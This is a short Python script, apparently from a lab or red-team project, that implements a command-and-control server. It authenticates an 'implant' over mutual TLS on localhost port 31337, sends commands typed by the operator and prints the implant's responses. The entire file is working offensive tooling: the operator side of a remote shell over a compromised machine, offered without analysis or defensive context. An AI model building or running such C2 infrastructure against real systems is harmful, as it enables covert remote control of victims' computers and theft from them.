#!/usr/bin/env python3

import socket
import ssl

certfile = "../certs/server/avocado-server.c2.pem"
keyfile = "../certs/server/avocado-server.c2-key.pem"
client_cert = "../certs/client/rootCA.pem"

# mTLS settings
ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
ctx.verify_mode = ssl.CERT_REQUIRED
ctx.load_cert_chain(certfile, keyfile)
ctx.load_verify_locations(cafile=client_cert)
ctx.post_handshake_auth = True

# Create a TCP socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(("127.0.0.1", 31337))
    s.listen()
    # Use TLS over the socket
    with ctx.wrap_socket(s, server_side=True) as ssock:
        conn, addr = ssock.accept()
        conn.verify_client_post_handshake()
        # Send data to implant
        while True:
            userin = input("> ")
            conn.sendall(userin.encode("utf-8"))
            data = conn.recv(1024)
            if not data:
                break
            else:
                print(data.decode("utf-8"))
